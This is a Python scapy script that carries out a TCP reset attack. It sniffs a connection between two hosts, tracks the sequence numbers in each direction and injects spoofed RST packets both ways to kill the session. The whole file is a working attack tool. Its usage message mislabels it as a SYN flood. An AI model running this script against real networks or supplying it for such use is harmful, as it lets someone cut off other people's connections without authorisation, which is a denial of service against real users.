from scapy.all import *
from sys import argv


def track_and_reset(src_ip, dst_ip, dst_port):
    flows = {}

    def pkt_cb(pkt):
        if not pkt.haslayer(TCP):
            return
        ip, tcp = pkt[IP], pkt[TCP]

        if {ip.src, ip.dst} != {src_ip, dst_ip}:
            return  # different hosts
        if dst_port not in (tcp.sport, tcp.dport):
            return  # different port

        key = (ip.src, ip.dst)
        next_seq = tcp.seq + len(tcp.payload)
        flows[key] = (next_seq, tcp)

        rev_key = (ip.dst, ip.src)
        if rev_key in flows:
            inject_rst(flows, src_ip, dst_ip)

    sniff(filter=f"tcp and host {src_ip} and host {dst_ip} and port {dst_port}",
          prn=pkt_cb, store=False)

def inject_rst(flows, src_ip, dst_ip):    
    fwd_next_seq, fwd_tcp = flows[(src_ip, dst_ip)]
    fwd_rst = (IP(src=src_ip, dst=dst_ip) /
               TCP(sport=fwd_tcp.sport, dport=fwd_tcp.dport,
                   flags="R", seq=fwd_next_seq))

    rev_next_seq, rev_tcp = flows[(dst_ip, src_ip)]
    rev_rst = (IP(src=dst_ip, dst=src_ip) /
               TCP(sport=rev_tcp.sport, dport=rev_tcp.dport,
                   flags="R", seq=rev_next_seq))

    
    for _ in range(3):
        send(fwd_rst, verbose=False)
        send(rev_rst, verbose=False)
        time.sleep(0.01)

    sys.exit(0)

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 syn_flood.py <ip_source> <ip_dst> <dst_port>")
        sys.exit(1)

    src_ip = argv[1]
    dst_ip = argv[2]
    dst_port = int(argv[3])
    
    # Create a TCP packet with the RST flag set

    track_and_reset(src_ip, dst_ip, dst_port)
    
if __name__ == "__main__":
    main()